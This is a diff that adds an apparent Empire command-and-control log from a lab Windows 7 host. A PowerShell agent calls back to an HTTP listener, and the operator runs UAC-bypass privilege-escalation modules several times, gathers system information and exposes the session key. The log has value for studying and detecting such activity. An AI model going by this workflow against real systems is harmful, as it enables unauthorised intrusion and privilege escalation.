@@ -1,0 +1,116 @@
+
+2019-05-25 22:30:29 : 
+
+[*] Agent info:
+  nonce           	8504304550390918
+  jitter          	0.6
+  servers         	None
+  internal_ip     	192.168.153.140
+  working_hours   	
+  session_key     	T14hKNf}jgE8-_e&\)ZL2WqwD,7$=sAm
+  children        	None
+  checkin_time    	2019-05-25 22:30:29
+  hostname        	WIN-JEQCV2C1G8I
+  id              	1
+  delay           	6
+  username        	WIN-JEQCV2C1G8I\User
+  kill_date       	
+  parent          	None
+  process_name    	powershell
+  listener        	http
+  process_id      	2012
+  profile         	/aduin/gut.php,/nuws.php,/lugin/pruccess.php |Mozilla/5.0 (X11; Linux
+                                x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75
+                                Safari/537.36
+  os_details      	Microsoft Windows 7 Professional
+  lost_limit      	0
+  taskings        	None
+  name            	VPBDTRG2
+  language        	powershell
+  external_ip     	192.168.153.140
+  session_id      	VPBDTRG2
+  lastseen_time   	2019-05-25 22:30:29
+  language_version	2
+  high_integrity  	0
+
+
+[+] Agent VPBDTRG2 now active:
+
+
+2019-05-25 22:33:53 : 
+Tasked agent to run module powershell/privesc/bypassuac
+
+2019-05-25 22:33:58 : 
+Job started: VPU2Z3
+
+2019-05-25 22:36:35 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-25 22:36:37 : 
+Job started: 31XC8Y
+
+2019-05-25 22:37:06 : 
+Tasked agent to get system information
+
+2019-05-25 22:37:13 : 
+Listener:         http://192.168.153.136:8081
+Internal IP:    192.168.153.140
+Username:         WIN-JEQCV2C1G8I\User
+Hostname:       WIN-JEQCV2C1G8I
+OS:               Microsoft Windows 7 Professional 
+High Integrity:   0
+Process Name:     powershell
+Process ID:       2012
+Language:         powershell
+Language Version: 2
+
+
+2019-05-25 22:38:07 : 
+Tasked agent to run module powershell/privesc/bypassuac_eventvwr
+
+2019-05-25 22:38:11 : 
+Job started: E8WSA4
+
+2019-05-25 22:39:21 : 
+Tasked agent to run module powershell/privesc/bypassuac_wscript
+
+2019-05-25 22:39:24 : 
+Job started: AV4BLW
+
+2019-05-25 22:39:41 : 
+Tasked agent to run command pwd
+
+2019-05-25 22:39:49 : 
+Path                                                                                                                   
+----                                                                                                                   
+C:\Users\User
+
+2019-05-25 22:40:54 : 
+Tasked agent to run module powershell/privesc/ask
+
+2019-05-25 22:40:54 : 
+Job started: KBUX7E
+
+2019-05-25 22:43:28 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-25 22:43:37 : 
+Job started: HDL1ES
+
+2019-05-25 22:49:31 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-25 22:49:34 : 
+Job started: NYP29U
+
+2019-05-25 22:50:29 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-25 22:50:38 : 
+Job started: 29AHT8
+
+2019-05-25 22:51:39 : 
+Tasked agent to run module powershell/privesc/bypassuac
+
+2019-05-25 22:51:42 : 
+Job started: 8HVFMR
